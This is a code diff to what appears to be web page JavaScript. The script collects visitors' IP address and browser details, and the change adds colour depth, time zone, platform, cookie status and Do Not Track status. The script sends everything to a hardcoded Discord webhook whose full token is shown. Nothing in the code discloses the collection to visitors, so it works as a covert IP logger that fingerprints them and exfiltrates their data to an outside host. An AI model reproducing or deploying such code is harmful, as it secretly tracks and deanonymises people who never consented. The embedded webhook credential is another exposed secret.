@@ -46,7 +46,7 @@
             const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257984661200830484/9OGdZXwcO93Ox8MJ2rHDJRZ5GSIIGJsZivt-9KO1HuPWZ9dBW5FuvIMHPl9PVlz87Np6';
 
             const data = {
-                content: `User Details: ${details}`
+                content: `User Details:\n${details}`
             };
 
             fetch(webhookUrl, {
@@ -78,9 +78,14 @@
             const language = navigator.language;
             const screenWidth = screen.width;
             const screenHeight = screen.height;
+            const colorDepth = screen.colorDepth;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const platform = navigator.platform;
+            const cookiesEnabled = navigator.cookieEnabled;
+            const doNotTrack = navigator.doNotTrack || 'Not enabled';
 
             return ipFetch.then(ip => {
-                return `IP: ${ip}\nUser-Agent: ${userAgent}\nLanguage: ${language}\nScreen Resolution: ${screenWidth}x${screenHeight}`;
+                return `IP: ${ip}\nUser-Agent: ${userAgent}\nLanguage: ${language}\nScreen Resolution: ${screenWidth}x${screenHeight}\nColor Depth: ${colorDepth} bits\nTime Zone: ${timeZone}\nPlatform: ${platform}\nCookies Enabled: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}`;
             });
         }
 
